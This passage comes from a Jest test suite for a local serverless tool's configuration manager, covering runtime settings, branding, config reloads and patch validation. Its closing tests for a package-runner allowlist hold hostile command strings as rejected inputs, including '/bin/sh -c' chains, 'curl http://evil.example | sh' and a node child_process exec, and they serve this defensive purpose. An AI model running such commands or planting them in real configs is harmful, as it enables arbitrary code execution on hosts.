      serviceRuntime: { access: { apiPort: 3001 } },
    });
    expect(cm.getRuntimeConfigForService('/abs/access')).toEqual({
      enabled: false,
      execution: 'artifact',
      watch: true,
      apiPort: 3001,
      invokePort: undefined,
    });
  });

  it('keeps watch undefined when neither the service nor the global block set it', () => {
    const cm = cmWith({
      lambdaRuntime: { execution: 'source' },
      serviceRuntime: { access: { enabled: true } },
    });
    expect(cm.getRuntimeConfigForService('/abs/access').watch).toBeUndefined();
  });

  it('returns only globals for a service with no matching override', () => {
    const cm = cmWith({
      lambdaRuntime: { execution: 'source' },
      serviceRuntime: { access: { execution: 'artifact' } },
    });
    expect(cm.getRuntimeConfigForService('/abs/other').execution).toBe('source');
  });
});

describe('printSummary', () => {
  it('prints a full summary with dynamo proxy + auto package + config file', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(
      JSON.stringify({ enableDynamoProxy: true, autoPackage: true }),
    );
    const cm = freshConfigManager();
    expect(() => cm.printSummary()).not.toThrow();
    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
    expect(out).toContain('Configuration Summary');
    expect(out).toContain('Self Engine Port: 14566');
    expect(out).toContain('DynamoDB Proxy Port');
    expect(out).toContain('Package Command');
    expect(out).toContain('Config File');
  });

  it('omits the proxy/package/config sections when they are off', () => {
    const cm = freshConfigManager();
    expect(() => cm.printSummary()).not.toThrow();
    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
    // No dynamo proxy → no proxy port line; no auto package → no command line.
    expect(out).not.toContain('DynamoDB Proxy Port');
    expect(out).not.toContain('Package Command');
    // No config file loaded (env-only) → no config file line.
    expect(out).not.toContain('Config File');
  });

  it('prints global package args/env (keys only) and per-service packaging when set', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(
      JSON.stringify({
        autoPackage: true,
        packageArgs: ['--param=custom-stage=offline'],
        packageEnv: { AWS_ACCESS_KEY_ID: 'super-secret' },
        servicePackaging: { access: { packageArgs: ['--param=custom-stage=offline'] } },
      }),
    );
    const cm = freshConfigManager();
    cm.printSummary();
    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
    expect(out).toContain('Package Args (global): --param=custom-stage=offline');
    expect(out).toContain('Package Env (global): AWS_ACCESS_KEY_ID');
    expect(out).toContain('Per-service Packaging: access');
    // Secret env VALUES must never be printed.
    expect(out).not.toContain('super-secret');
  });

  it('prints "Config Secrets: N" when the config declares a non-empty secrets map', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ secrets: { a: 'x', b: 'y' } }));
    const cm = freshConfigManager();
    cm.printSummary();
    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
    expect(out).toContain('Config Secrets: 2');
  });
});


describe('self engine configuration', () => {
  function cmWith(config: Record<string, unknown>): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('LSS_ENGINE_PORT merges over the file selfEngine block', () => {
    process.env.LSS_ENGINE_PORT = '24566';
    const cm = cmWith({ engine: 'self', selfEngine: { account: '111111111111' } });
    const resolved = cm.getSelfEngineConfig();
    expect(resolved.port).toBe(24566);
    expect(resolved.account).toBe('111111111111');
  });

  // Port + data dir from the environment is all a second instance needs: no
  // config file to write, nothing shared with the dev stack.
  it('LSS_ENGINE_DATA_DIR overrides the resolved dataDir', () => {
    process.env.LSS_ENGINE_DATA_DIR = '/tmp/lss-run-7/engine';
    const cm = cmWith({ engine: 'self', selfEngine: { dataDir: '/from/file' } });
    expect(cm.getSelfEngineConfig().dataDir).toBe('/tmp/lss-run-7/engine');
  });

  it('getSelfEngineConfig applies every default', () => {
    const cm = freshConfigManager();
    const resolved = cm.getSelfEngineConfig();
    expect(resolved.port).toBe(14566);
    // With no stateDir the fallback root is scoped to this project — a flat
    // ~/.lss/engine made every checkout on the machine share one engine state.
    expect(resolved.dataDir).toBe(
      path.join(require('os').homedir(), '.lss', 'projects', projectCacheSegment(cm.getProjectRoot()), 'engine'),
    );
    expect(resolved.account).toBe('000000000000');
    expect(resolved.idleUnloadMs).toBe(300000);
    expect(resolved.memoryBudgetMb).toBe(128);
    expect(resolved.fsync).toBe(false);
    expect(resolved.fallbackEndpoint).toBeNull();
    expect(resolved.persistence).toBe(true);
    expect(resolved.region).toBe('us-east-1');
  });

  it('getSelfEngineConfig honors explicit values', () => {
    const cm = cmWith({
      selfEngine: {
        port: 15000,
        dataDir: '/abs/engine',
        idleUnloadMs: 1000,
        memoryBudgetMb: 64,
        fsync: true,
        fallbackEndpoint: 'http://localhost:4566',
      },
    });
    const resolved = cm.getSelfEngineConfig();
    expect(resolved.port).toBe(15000);
    expect(resolved.dataDir).toBe('/abs/engine');
    expect(resolved.idleUnloadMs).toBe(1000);
    expect(resolved.memoryBudgetMb).toBe(64);
    expect(resolved.fsync).toBe(true);
    expect(resolved.fallbackEndpoint).toBe('http://localhost:4566');
  });

  it('resolves a relative dataDir against cwd', () => {
    const cm = cmWith({ selfEngine: { dataDir: 'rel/engine' } });
    expect(cm.getSelfEngineConfig().dataDir).toBe(path.resolve(process.cwd(), 'rel/engine'));
  });

  it('defaults dataDir under stateDir when stateDir is set (test isolation)', () => {
    const cm = cmWith({ stateDir: '/abs/state' });
    expect(cm.getSelfEngineConfig().dataDir).toBe(path.join('/abs/state', 'engine'));
  });

  it('getEngineEndpoint points at the self engine port', () => {
    expect(freshConfigManager().getEngineEndpoint()).toBe('http://localhost:14566');
    expect(cmWith({ selfEngine: { port: 15000 } }).getEngineEndpoint())
      .toBe('http://localhost:15000');
  });

  it('printSummary shows the engine lines', () => {
    const cm = cmWith({ selfEngine: { fallbackEndpoint: 'http://legacy:4566' } });
    cm.printSummary();
    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
    expect(out).toContain('Self Engine Port: 14566');
    expect(out).toContain('Self Engine Data Dir:');
    expect(out).toContain('Self Engine Fallback: http://legacy:4566');
  });

  it('printSummary omits the fallback line when unset', () => {
    const cm = cmWith({});
    cm.printSummary();
    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
    expect(out).toContain('Self Engine Port:');
    expect(out).not.toContain('Self Engine Fallback');
  });

});

describe('getInvokeHost', () => {
  it('defaults to 127.0.0.1 (nothing runs in a container)', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ engine: 'self' }));
    expect(freshConfigManager().getInvokeHost()).toBe('127.0.0.1');
  });

  it('an explicit invokeHost still wins', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(
      JSON.stringify({ engine: 'self', lambdaRuntime: { invokeHost: '10.0.0.7' } }),
    );
    expect(freshConfigManager().getInvokeHost()).toBe('10.0.0.7');
  });
});

describe('branding', () => {
  function cmWith(config: Record<string, unknown>, extraFiles: string[] = []): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile || extraFiles.includes(String(p)));
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('returns neutral defaults when branding is not configured', () => {
    expect(freshConfigManager().getBranding()).toEqual({
      title: 'Local Serverless Stack',
      subtitle: 'Local development control plane',
      logoUrl: null,
      faviconUrl: null,
      defaultTheme: 'dark',
      colors: {},
      themeColors: { dark: {}, light: {} },
    });
  });

  it('passes through title, subtitle, defaultTheme and color overrides', () => {
    const cm = cmWith({
      branding: {
        title: 'Acme Cloud',
        subtitle: 'Sandbox local',
        defaultTheme: 'light',
        colors: { 'brand-primary': '#e63946' },
        themeColors: { dark: { 'bg-primary': '#111' } },
      },
    });
    const branding = cm.getBranding();
    expect(branding.title).toBe('Acme Cloud');
    expect(branding.subtitle).toBe('Sandbox local');
    expect(branding.defaultTheme).toBe('light');
    expect(branding.colors).toEqual({ 'brand-primary': '#e63946' });
    expect(branding.themeColors).toEqual({ dark: { 'bg-primary': '#111' }, light: {} });
  });

  it('falls back to dark for an invalid defaultTheme', () => {
    expect(cmWith({ branding: { defaultTheme: 'blue' } }).getBranding().defaultTheme).toBe('dark');
  });

  it('http(s) and data logo URLs pass through untouched and resolve no local file', () => {
    const cm = cmWith({ branding: { logo: 'https://acme.dev/logo.svg', favicon: 'data:image/png;base64,AAA' } });
    expect(cm.getBranding().logoUrl).toBe('https://acme.dev/logo.svg');
    expect(cm.getBranding().faviconUrl).toBe('data:image/png;base64,AAA');
    expect(cm.getBrandingAssetFile('logo')).toBeNull();
    expect(cm.getBrandingAssetFile('favicon')).toBeNull();
  });

  it('a relative logo path resolves from the config dir and is served by the orchestrator', () => {
    const resolved = path.resolve(process.cwd(), './assets/logo.svg');
    const cm = cmWith({ branding: { logo: './assets/logo.svg' } }, [resolved]);
    expect(cm.getBrandingAssetFile('logo')).toBe(resolved);
    expect(cm.getBranding().logoUrl).toBe('/api/config/branding/logo');
  });

  it('an absolute logo path is used as-is when the file exists', () => {
    const cm = cmWith({ branding: { logo: '/srv/assets/logo.png' } }, ['/srv/assets/logo.png']);
    expect(cm.getBrandingAssetFile('logo')).toBe('/srv/assets/logo.png');
    expect(cm.getBranding().logoUrl).toBe('/api/config/branding/logo');
  });

  it('a logo path pointing to a missing file yields null (no broken img in the UI)', () => {
    const cm = cmWith({ branding: { logo: './missing/logo.svg' } });
    expect(cm.getBrandingAssetFile('logo')).toBeNull();
    expect(cm.getBranding().logoUrl).toBeNull();
  });

  it('resolves relative assets from process.cwd() when no config path is recorded (defensive)', () => {
    const resolved = path.resolve(process.cwd(), './assets/logo.svg');
    const cm = cmWith({ branding: { logo: './assets/logo.svg' } }, [resolved]);
    (cm as any).configPath = '';
    expect(cm.getBrandingAssetFile('logo')).toBe(resolved);
  });
});

describe('getEnvOverriddenKeys', () => {
  it('is empty when no override env var is set', () => {
    expect(freshConfigManager().getEnvOverriddenKeys()).toEqual([]);
  });

  it('lists keys masked by loadFromEnv-applied env vars', () => {
    process.env.AWS_REGION = 'sa-east-1';
    process.env.LSS_LAMBDA_WATCH = 'true';
    process.env.LSS_ENABLE_DYNAMO_PROXY = '1';
    const keys = freshConfigManager().getEnvOverriddenKeys();
    expect(keys).toEqual(expect.arrayContaining(['region', 'lambdaRuntime', 'enableDynamoProxy']));
    expect(keys).not.toContain('serverPort');
  });

  it('ignores empty-string env vars — loadFromEnv does not apply them, so they mask nothing', () => {
    process.env.LSS_DEBUG = '';
    process.env.AWS_REGION = '';
    expect(freshConfigManager().getEnvOverriddenKeys()).toEqual([]);
  });

  it('does not list the deprecated unprefixed ENABLE_DYNAMO_PROXY — a file value always beats it', () => {
    process.env.ENABLE_DYNAMO_PROXY = '1';
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ enableDynamoProxy: false }));
    const cm = freshConfigManager();
    // The saved value takes effect (getter prefers the config), so no mask.
    expect(cm.isEnableDynamoProxy()).toBe(false);
    expect(cm.getEnvOverriddenKeys()).toEqual([]);
  });
});

describe('reloadFromDisk', () => {
  const cwdFile = path.join(process.cwd(), 'lss.config.json');

  it('picks up file changes; boot-materialized keys land in restartRequired, lazy keys do not', () => {
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    let content = JSON.stringify({ serverPort: 14566, seedsDir: './seeds' });
    fs.readFileSync.mockImplementation(() => content);
    const cm = freshConfigManager();
    expect(cm.getServerPort()).toBe(14566);

    content = JSON.stringify({ serverPort: 3200, seedsDir: './other-seeds' });
    const result = cm.reloadFromDisk();
    expect(cm.getServerPort()).toBe(3200);
    expect(cm.getSeedsDir()).toBe(path.resolve(process.cwd(), './other-seeds'));
    expect(result.path).toBe(cwdFile);
    expect(result.restartRequired).toEqual(['serverPort']);
  });

  it('returns an empty restartRequired when only lazily-consumed keys changed', () => {
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    let content = JSON.stringify({ autoPackage: false });
    fs.readFileSync.mockImplementation(() => content);
    const cm = freshConfigManager();
    content = JSON.stringify({ autoPackage: true });
    const result = cm.reloadFromDisk();
    expect(cm.isAutoPackage()).toBe(true);
    expect(result.restartRequired).toEqual([]);
  });

  it('resets to defaults when the config file disappeared', () => {
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ serverPort: 9000 }));
    const cm = freshConfigManager();
    expect(cm.getServerPort()).toBe(9000);
    fs.existsSync.mockReturnValue(false);
    const result = cm.reloadFromDisk();
    expect(result.path).toBe('');
    expect(cm.getServerPort()).toBe(14566);
    expect(result.restartRequired).toEqual(['serverPort']);
  });

  it('is a no-op reload when no config file was ever loaded', () => {
    const cm = freshConfigManager();
    const result = cm.reloadFromDisk();
    expect(result.path).toBe('');
    expect(result.restartRequired).toEqual([]);
  });

  it('refuses to reload when the file no longer parses — the working config stays intact', () => {
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    let content = JSON.stringify({ serverPort: 9000, seedsDir: '/abs/seeds' });
    fs.readFileSync.mockImplementation(() => content);
    const cm = freshConfigManager();
    expect(cm.getServerPort()).toBe(9000);

    content = '{ "serverPort": 9000, '; // hand-edit typo
    let thrown: { name: string; details: string[] } | undefined;
    try {
      cm.reloadFromDisk();
    } catch (e) {
      thrown = e as { name: string; details: string[] };
    }
    expect(thrown?.name).toBe('ConfigValidationError');
    expect(thrown?.details[0]).toContain('not valid JSON');
    // Nothing was discarded: the previous config still answers.
    expect(cm.getServerPort()).toBe(9000);
    expect(cm.getSeedsDir()).toBe('/abs/seeds');
    expect(cm.getConfigPath()).toBe(cwdFile);
  });
});

describe('updateConfig', () => {
  const cwdFile = path.join(process.cwd(), 'lss.config.json');
  // Simulated file on "disk": writeFileSync stores it, readFileSync serves it,
  // so the write→reload round trip behaves like a real filesystem.
  let fileContent: string | null;

  function setupFile(initial: Record<string, unknown> | null): CM {
    fileContent = initial === null ? null : JSON.stringify(initial);
    fs.existsSync.mockImplementation((p) => p === cwdFile && fileContent !== null);
    fs.readFileSync.mockImplementation(() => {
      if (fileContent === null) throw new Error('ENOENT');
      return fileContent;
    });
    fs.writeFileSync.mockImplementation((_p, data) => {
      fileContent = String(data);
    });
    return freshConfigManager();
  }

  function written(): Record<string, unknown> {
    return JSON.parse(fileContent as string);
  }

  function updateErr(cm: CM, patch: unknown): { name: string; details: string[] } {
    try {
      cm.updateConfig(patch as never);
    } catch (e) {
      return e as { name: string; details: string[] };
    }
    throw new Error('expected updateConfig to throw');
  }

  it('rejects a non-object patch', () => {
    const err = updateErr(setupFile({}), ['not', 'an', 'object']);
    expect(err.name).toBe('ConfigValidationError');
    expect(err.details[0]).toContain('JSON object');
  });

  it('validates scanIgnore as a list of non-empty strings', () => {
    const cm = setupFile({});
    expect(updateErr(cm, { scanIgnore: 'infra/global' }).details[0]).toContain('array of non-empty strings');
    expect(updateErr(cm, { scanIgnore: ['ok', ''] }).details[0]).toContain('array of non-empty strings');
    cm.updateConfig({ scanIgnore: ['infra/bootstrap', 'infra/global'] });
    expect(written().scanIgnore).toEqual(['infra/bootstrap', 'infra/global']);
  });

  // packageCwd becomes a spawned child's working directory, so the write path
  // refuses anything that is not a plain path inside the project — the realpath
  // fence at resolution time is the second half of the same rule.
  it('validates packageCwd as a project-relative path', () => {
    const cm = setupFile({});
    const errs = (patch: unknown) => updateErr(cm, patch).details[0];
    expect(errs({ servicePackaging: { shared: { packageCwd: '/etc' } } })).toContain('inside the project root');
    expect(errs({ servicePackaging: { shared: { packageCwd: '../up' } } })).toContain('inside the project root');
    expect(errs({ servicePackaging: { shared: { packageCwd: 'a/../../b' } } })).toContain('inside the project root');
    expect(errs({ servicePackaging: { shared: { packageCwd: '' } } })).toContain('non-empty string');
    expect(errs({ servicePackaging: { shared: { packageCwd: 7 } } })).toContain('non-empty string');
    cm.updateConfig({ servicePackaging: { shared: { packageCwd: 'tools/packaging' } } });
    expect(written().servicePackaging).toEqual({ shared: { packageCwd: 'tools/packaging' } });
  });

  it('rejects the blocked secrets key and unknown keys', () => {
    const err = updateErr(setupFile({}), { secrets: { a: 'x' }, bogusKey: 1 });
    expect(err.details).toHaveLength(2);
    expect(err.details[0]).toContain('"secrets" cannot be edited');
    expect(err.details[1]).toContain('unknown config key "bogusKey"');
  });

  // 0.x's LocalStack keys are gone, not silently accepted: an old config that
  // still carries them tells the user which ones to drop.
  it('reports removed LocalStack keys as unknown', () => {
    const err = updateErr(setupFile({}), {
      mode: 'external',
      localstackPort: 4566,
      localstackEdition: 'pro',
      services: ['dynamodb'],
      aossSidecar: { enabled: true },
    });
    expect(err.details).toEqual([
      'unknown config key "mode"',
      'unknown config key "localstackPort"',
      'unknown config key "localstackEdition"',
      'unknown config key "services"',
      'unknown config key "aossSidecar"',
    ]);
  });

  it('aggregates every value-shape error instead of failing on the first', () => {
    const err = updateErr(setupFile({}), {
      serverPort: 0, // port out of range
      dynamoProxyPort: 1.5, // port not an integer
      packageTimeoutMs: 0, // positiveInt
      persistence: 'yes', // boolean
      region: '', // empty string
      packageArgs: [1], // stringArray (non-string element)
      packageEnv: { A: 1 }, // stringRecord (non-string value)
      lambdaRuntime: [], // object (array is not a plain object)
    });
    expect(err.details).toEqual([
      '"serverPort" must be an integer port between 1 and 65535',
      '"dynamoProxyPort" must be an integer port between 1 and 65535',
      '"packageTimeoutMs" must be a positive integer',
      '"persistence" must be a boolean',
      '"region" must be a non-empty string',
      '"packageArgs" must be an array of strings',
      '"packageEnv" must be an object of string values',
      '"lambdaRuntime" must be an object',
    ]);
    expect(fs.writeFileSync).not.toHaveBeenCalled();
  });

  // idleTimeoutMs accepts 0 (meaning "never unload"), so it validates as
  // nonNegativeInt rather than positiveInt.
  it('rejects a value outside a subkey enum', () => {
    expect(updateErr(setupFile({}), { lambdaRuntime: { execution: 'bogus' } }).details).toEqual([
      '"lambdaRuntime.execution" must be one of: auto, artifact, source',
    ]);
    expect(updateErr(setupFile({}), { branding: { defaultTheme: 'sepia' } }).details).toEqual([
      '"branding.defaultTheme" must be one of: dark, light',
    ]);
  });

  it('rejects a negative or fractional idleTimeoutMs but accepts 0', () => {
    expect(updateErr(setupFile({}), { lambdaRuntime: { idleTimeoutMs: -5 } }).details).toEqual([
      '"lambdaRuntime.idleTimeoutMs" must be an integer >= 0',
    ]);
    expect(updateErr(setupFile({}), { lambdaRuntime: { idleTimeoutMs: 1.5 } }).details).toEqual([
      '"lambdaRuntime.idleTimeoutMs" must be an integer >= 0',
    ]);
    const cm = setupFile({});
    expect(() => cm.updateConfig({ lambdaRuntime: { idleTimeoutMs: 0 } })).not.toThrow();
  });

  it('validates subkeys of fixed-shape object blocks — garbage never reaches the file', () => {
    const cm = setupFile({});
    expect(updateErr(cm, { selfEngine: { dataDir: 123 } }).details).toEqual([
      '"selfEngine.dataDir" must be a non-empty string',
    ]);
    expect(updateErr(cm, { selfEngine: { port: 'abc' } }).details).toEqual([
      '"selfEngine.port" must be an integer port between 1 and 65535',
    ]);
    expect(updateErr(cm, { lambdaRuntime: { execution: 'bogus' } }).details).toEqual([
      '"lambdaRuntime.execution" must be one of: auto, artifact, source',
    ]);
    expect(updateErr(cm, { lambdaRuntime: { turbo: true } }).details).toEqual([
      'unknown config key "lambdaRuntime.turbo"',
    ]);
    expect(updateErr(cm, { branding: { themeColors: { dark: 'red' } } }).details).toEqual([
      '"branding.themeColors.dark" must be an object of string values',
    ]);
    expect(updateErr(cm, { branding: { themeColors: { dusk: {} } } }).details).toEqual([
      'unknown config key "branding.themeColors.dusk"',
    ]);
    expect(fs.writeFileSync).not.toHaveBeenCalled();
  });

  it('validates entries of map-shaped blocks (servicePackaging/serviceRuntime)', () => {
    const cm = setupFile({});
    expect(updateErr(cm, { servicePackaging: { access: 'broken' } }).details).toEqual([
      '"servicePackaging.access" must be an object',
    ]);
    expect(updateErr(cm, { servicePackaging: { access: { packageTimeoutMs: 'x' } } }).details).toEqual([
      '"servicePackaging.access.packageTimeoutMs" must be a positive integer',
    ]);
    expect(updateErr(cm, { servicePackaging: { access: { unknownKey: 1 } } }).details).toEqual([
      'unknown config key "servicePackaging.access.unknownKey"',
    ]);
    expect(updateErr(cm, { serviceRuntime: { access: { apiPort: 0 } } }).details).toEqual([
      '"serviceRuntime.access.apiPort" must be an integer port between 1 and 65535',
    ]);
    expect(fs.writeFileSync).not.toHaveBeenCalled();
  });

  it('accepts valid nested values, null subkeys and null map entries', () => {
    const cm = setupFile({
      lambdaRuntime: { watch: true },
      servicePackaging: { access: { packageArgs: ['--a'] }, billing: { packageTimeoutMs: 1 } },
    });
    cm.updateConfig({
      selfEngine: { port: 15000, fsync: true, fallbackEndpoint: 'http://localhost:4566' },
      lambdaRuntime: { watch: null, execution: 'source' },
      servicePackaging: {
        // packageArgs: null inside a map entry is tolerated by validation and
        // deletes that subkey when the entry merges (see the dedicated
        // per-entry merge tests below).
        access: { packageCommand: 'npx sls package', packageEnv: { A: '1' }, packageArgs: null },
        billing: null,
      },
      branding: { themeColors: { dark: { 'brand-primary': '#111' } } },
    });
    expect(written()).toMatchObject({
      selfEngine: { port: 15000, fsync: true, fallbackEndpoint: 'http://localhost:4566' },
      lambdaRuntime: { execution: 'source' },
      servicePackaging: { access: { packageCommand: 'npx sls package', packageEnv: { A: '1' } } },
      branding: { themeColors: { dark: { 'brand-primary': '#111' } } },
    });
    // watch deleted, billing entry deleted.
    expect(written().lambdaRuntime).not.toHaveProperty('watch');
    expect(written().servicePackaging).not.toHaveProperty('billing');
  });

  it('writes valid keys, preserves unknown file keys, reloads, and classifies restart vs lazy', () => {
    const cm = setupFile({ region: 'us-east-1', someCustomKey: true });
    const result = cm.updateConfig({
      serverPort: 3200,
      region: 'eu-west-1',
      debug: true,
      packageTimeoutMs: 1000,
      packageArgs: ['--param=custom-stage=offline'],
      packageEnv: { A: '1' },
    });
    expect(written()).toMatchObject({
      serverPort: 3200,
      region: 'eu-west-1',
      debug: true,
      packageArgs: ['--param=custom-stage=offline'],
      packageTimeoutMs: 1000,
      packageEnv: { A: '1' },
      someCustomKey: true,
    });
    // Pretty-printed with a trailing newline so the diff the human commits is clean.
    expect(fileContent!.endsWith('\n')).toBe(true);
    // The in-memory config followed the write.
    expect(cm.getServerPort()).toBe(3200);
    expect(cm.getRegion()).toBe('eu-west-1');
    expect(result.path).toBe(cwdFile);
    // Boot-materialized keys need stop/start; packageTimeoutMs/packageEnv are lazy.
    expect(result.restartRequired).toEqual(['serverPort', 'region', 'debug']);
    expect(result.envOverridden).toEqual([]);
  });

  it('null deletes a top-level key from the file', () => {
    const cm = setupFile({ debug: true });
    const result = cm.updateConfig({ debug: null });
    expect(written()).not.toHaveProperty('debug');
    expect(cm.isDebug()).toBe(false);
    expect(result.restartRequired).toEqual(['debug']);
  });

  it('merges object blocks one level deep: siblings survive, null deletes the subkey', () => {
    const cm = setupFile({
      branding: { title: 'Old', subtitle: 'Bye', logo: './logo.svg' },
    });
    cm.updateConfig({ branding: { title: 'New', subtitle: null } });
    expect(written().branding).toEqual({ title: 'New', logo: './logo.svg' });
  });

  it('map blocks merge per entry: one service edit never drops another service or that entry\'s siblings', () => {
    const cm = setupFile({
      serviceRuntime: {
        orders: { apiPort: 3631, execution: 'source' },
        billing: { apiPort: 3632 },
      },
      servicePackaging: {
        orders: { packageCommand: 'npm run pkg', packageEnv: { TOKEN: 's' } },
      },
    });
    cm.updateConfig({
      serviceRuntime: { orders: { apiPort: 4001, invokePort: 14001 } },
      servicePackaging: { orders: { packageCommand: 'npx sls package' } },
    });
    expect(written().serviceRuntime).toEqual({
      // execution survives the port edit; billing untouched.
      orders: { apiPort: 4001, invokePort: 14001, execution: 'source' },
      billing: { apiPort: 3632 },
    });
    // packageEnv (possibly secret) survives a command edit.
    expect(written().servicePackaging).toEqual({
      orders: { packageCommand: 'npx sls package', packageEnv: { TOKEN: 's' } },
    });
  });

  it('map entries: null deletes a whole entry, null inside an entry deletes one subkey', () => {
    const cm = setupFile({
      serviceRuntime: {
        orders: { apiPort: 3631, invokePort: 13631 },
        billing: { apiPort: 3632 },
      },
    });
    cm.updateConfig({ serviceRuntime: { billing: null, orders: { invokePort: null } } });
    expect(written().serviceRuntime).toEqual({ orders: { apiPort: 3631 } });
  });

  it('drops an entry left empty by a delete, instead of writing a meaningless {}', () => {
    // An empty entry is truthy, so it would shadow a basename-keyed entry for
    // the same service and silently disable its override.
    const cm = setupFile({ serviceRuntime: { orders: { apiPort: 3631 } } });
    cm.updateConfig({ serviceRuntime: { orders: { apiPort: null } } });
    expect(written().serviceRuntime).toEqual({});
  });

  it('rejects a prototype-inherited key name instead of writing it to the file', () => {
    const cm = setupFile({});
    for (const patch of [
      { constructor: { anything: 1 } },
      { serviceRuntime: { orders: { toString: 'junk' } } },
      { branding: { hasOwnProperty: 'junk' } },
    ]) {
      expect(() => cm.updateConfig(patch as never)).toThrow(/unknown config key/);
    }
    expect(fs.writeFileSync).not.toHaveBeenCalled();
  });

  it('map entries replace a malformed existing entry that is not an object', () => {
    const cm = setupFile({ serviceRuntime: { orders: 'broken' } });
    cm.updateConfig({ serviceRuntime: { orders: { apiPort: 3631 } } });
    expect(written().serviceRuntime).toEqual({ orders: { apiPort: 3631 } });
  });

  it('replaces an object block whose existing file value is not an object', () => {
    const cm = setupFile({ lambdaRuntime: 'broken' });
    cm.updateConfig({ lambdaRuntime: { enabled: false } });
    expect(written().lambdaRuntime).toEqual({ enabled: false });
    expect(cm.isLambdaRuntimeEnabled()).toBe(false);
  });

  it('creates lss.config.json in the project root when no config file is loaded', () => {
    const cm = setupFile(null);
    expect(cm.getConfigPath()).toBe('');
    const result = cm.updateConfig({ serverPort: 4000 });
    expect(fs.writeFileSync).toHaveBeenCalledWith(cwdFile, expect.any(String));
    expect(written()).toEqual({ serverPort: 4000 });
    expect(result.path).toBe(cwdFile);
    expect(cm.getServerPort()).toBe(4000);
  });

  it('falls back to the target path when the reload does not find the written file', () => {
    fileContent = null;
    fs.existsSync.mockReturnValue(false);
    fs.readFileSync.mockImplementation(() => {
      throw new Error('ENOENT');
    });
    fs.writeFileSync.mockImplementation(() => undefined);
    const cm = freshConfigManager();
    const result = cm.updateConfig({ serverPort: 4100 });
    expect(result.path).toBe(cwdFile);
    // Nothing was loaded back, so the resolved value kept its default.
    expect(cm.getServerPort()).toBe(14566);
    expect(result.restartRequired).toEqual([]);
  });

  it('refuses to clobber an existing file that is not valid JSON', () => {
    fileContent = '{ not valid json';
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockImplementation(() => fileContent as string);
    fs.writeFileSync.mockImplementation(() => undefined);
    // Boot parse fails too (warns and continues), so no config is loaded.
    const cm = freshConfigManager();
    const err = updateErr(cm, { debug: true });
    expect(err.details[0]).toContain('not valid JSON');
    expect(fs.writeFileSync).not.toHaveBeenCalled();
  });

  it('writes to the explicitly loaded config path, not the cwd candidate', () => {
    process.env.LSS_CONFIG_PATH = '/custom/lss.json';
    fileContent = JSON.stringify({ region: 'us-east-1' });
    fs.existsSync.mockImplementation((p) => p === '/custom/lss.json');
    fs.readFileSync.mockImplementation(() => fileContent as string);
    fs.writeFileSync.mockImplementation((_p, data) => {
      fileContent = String(data);
    });
    const cm = freshConfigManager();
    cm.updateConfig({ debug: true });
    expect(fs.writeFileSync).toHaveBeenCalledWith('/custom/lss.json', expect.any(String));
  });

  it('flags patch keys currently masked by an env var (file written, env still wins)', () => {
    process.env.AWS_REGION = 'sa-east-1';
    const cm = setupFile({});
    const result = cm.updateConfig({ region: 'eu-west-1', branding: { title: 'X' } });
    expect(written().region).toBe('eu-west-1');
    // Resolved region did not move (env wins), so no restart is flagged — the
    // env mask is reported instead. branding has no env override channel.
    expect(cm.getRegion()).toBe('sa-east-1');
    expect(result.restartRequired).toEqual([]);
    expect(result.envOverridden).toEqual(['region']);
  });

  // PUT /api/config is unauthenticated and `packageCommand` is spawned by
  // serverless-packager (spawn(firstToken, restTokens), with `packageArgs`
  // appended) on the next POST /api/services/package. Without a fence that pair
  // is arbitrary code execution on the host, which is what these tests pin.
  describe('packageCommand runner allowlist', () => {
    const RUNNERS = 'npm, npx, yarn, pnpm, serverless, sls, osls';

    it('rejects the /bin/sh + packageArgs chain — nothing reaches the file', () => {
      const cm = setupFile({});
      // The demonstrated payload, verbatim: a shell as the command and the
      // real work smuggled in as argv (packageArgs bypasses the tokenizer
      // entirely, so a valid-looking string array is all the attacker needs).
      const err = updateErr(cm, {
        packageCommand: '/bin/sh',
        packageArgs: ['-c', 'id > /tmp/pwned'],
      });
      expect(err.name).toBe('ConfigValidationError');
      expect(err.details).toEqual([
        `"packageCommand" must start with one of: ${RUNNERS} — "/bin/sh" is not an allowed package runner`,
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    it('rejects interpreters, absolute paths and every path spelling', () => {
      const cm = setupFile({});
      const rejected: Array<[string, string]> = [
        ['bash -c "id"', 'bash'],
        ['curl http://evil.example | sh', 'curl'],
        ['node -e "require(\'child_process\').exec(\'id\')"', 'node'],
        ['/usr/local/bin/npm run package', '/usr/local/bin/npm'],
        // A relative path is still a path: it names a binary the caller
